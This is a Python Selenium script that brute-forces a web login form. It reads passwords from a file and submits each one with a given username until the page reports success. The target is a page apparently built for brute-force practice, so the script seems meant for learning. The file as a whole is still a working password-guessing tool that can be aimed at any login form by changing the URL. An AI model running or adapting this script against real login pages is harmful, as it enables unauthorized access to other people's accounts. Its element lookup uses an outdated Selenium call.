from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService

def login(username, password):
    service = ChromeService(executable_path='/path/to/chromedriver')  # Replace with the path to your chromedriver executable
    driver = webdriver.Chrome(service=service)

    try:
        driver.get("https://realslf.github.io/sampleforbruteforce/index.html")

        username_input = driver.find_element_by_id("username")
        password_input = driver.find_element_by_id("password")

        username_input.send_keys(username)
        password_input.send_keys(password)

        password_input.send_keys(Keys.RETURN)

        # Wait for the login to complete (adjust the sleep time as needed)
        driver.implicitly_wait(5)

        if "Login successful!" in driver.page_source:
            print("Login successful! Matched password:", password)
            return True
        else:
            return False
    except Exception as e:
        print("An error occurred during login:", e)
        return False
    finally:
        driver.quit()

def read_passwords_list(filename):
    passwords = []
    try:
        with open(filename, "r") as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Error: The file '{filename}' was not found.")
    return passwords

if __name__ == "__main__":
    username = input("Enter the username: ")
    password_file = input("Enter the filename containing passwords (e.g., passwords.txt): ")

    passwords = read_passwords_list(password_file)

    for password in passwords:
        if login(username, password):
            break
        else:
            print("Login failed with password:", password)
